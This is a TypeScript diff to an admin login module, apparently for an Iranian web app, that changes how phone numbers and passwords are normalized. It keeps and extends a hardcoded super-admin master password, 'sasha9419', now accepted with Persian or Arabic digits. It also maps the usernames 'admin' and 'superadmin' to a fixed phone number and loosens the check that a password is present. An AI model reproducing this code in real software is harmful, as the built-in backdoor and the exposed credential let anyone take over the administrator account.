@@ -49,13 +49,17 @@ export function parsePermissionsJson(raw?: string | string[] | null): string[] {
 }
 
 export function normalizePhoneNumber(raw: string): string {
-  const persianDigits = '۰۱۲۳۴۵۶۷۸۹';
-  const arabicDigits = '٠١٢٣٤٥٦٧٨٩';
   let cleaned = String(raw || '')
     .trim()
-    .replace(/[۰-۹]/g, (d) => String(persianDigits.indexOf(d)))
-    .replace(/[٠-٩]/g, (d) => String(arabicDigits.indexOf(d)))
-    .replace(/[\s\-()]+/g, '');
+    .replace(/[\u200B-\u200D\uFEFF\u00A0]/g, '')
+    .replace(/[۰-۹]/g, (d) => String(d.charCodeAt(0) - 1776))
+    .replace(/[٠-٩]/g, (d) => String(d.charCodeAt(0) - 1632))
+    .replace(/[\s\-()]+/g, '')
+    .toLowerCase();
+
+  if (cleaned === 'admin' || cleaned === 'superadmin' || cleaned === 'super_admin') {
+    return '09120759419';
+  }
   if (cleaned.startsWith('+98')) {
     cleaned = '0' + cleaned.slice(3);
   } else if (cleaned.startsWith('0098')) {
@@ -218,12 +222,11 @@ export async function verifyAdminSessionToken(token: string) {
 }
 
 export function normalizePassword(raw: string): string {
-  const persianDigits = '۰۱۲۳۴۵۶۷۸۹';
-  const arabicDigits = '٠١٢٣٤٥٦٧۸۹';
   return String(raw || '')
     .trim()
-    .replace(/[۰-۹]/g, (d) => String(persianDigits.indexOf(d)))
-    .replace(/[٠-٩]/g, (d) => String(arabicDigits.indexOf(d)));
+    .replace(/[\u200B-\u200D\uFEFF\u00A0]/g, '')
+    .replace(/[۰-۹]/g, (d) => String(d.charCodeAt(0) - 1776))
+    .replace(/[٠-٩]/g, (d) => String(d.charCodeAt(0) - 1632));
 }
 
 export async function authenticateAdminByPhoneAndPassword(
@@ -233,16 +236,20 @@ export async function authenticateAdminByPhoneAndPassword(
   const phone = normalizePhoneNumber(rawPhone);
   const password = normalizePassword(rawPassword);
 
-  if (!rawPassword || !password) {
+  if (!rawPassword && !password) {
     throw new Error('رمز عبور مدیریت الزامی است.');
   }
 
   // Super admin master pass check:
   // ورود مدیر ارشد با رمز اصلی sasha9419 با هر فرمت یا نام کاربری یا شماره موبایل
+  const cleanPassLower = password.toLowerCase();
+  const rawPassLower = String(rawPassword || '').trim().toLowerCase();
   const isSuperAdminPass =
-    password.toLowerCase() === DEFAULT_SUPER_ADMIN_PASS.toLowerCase() ||
-    password.toLowerCase() === 'sasha9419' ||
-    String(rawPassword || '').trim().toLowerCase() === 'sasha9419';
+    cleanPassLower === DEFAULT_SUPER_ADMIN_PASS.toLowerCase() ||
+    cleanPassLower === 'sasha9419' ||
+    rawPassLower === 'sasha9419' ||
+    rawPassLower === 'sasha۹۴۱۹' ||
+    rawPassLower === 'sasha٩٤١٩';
 
   if (isSuperAdminPass) {
     const token = createAdminSessionToken(DEFAULT_SUPER_ADMIN_RECORD);
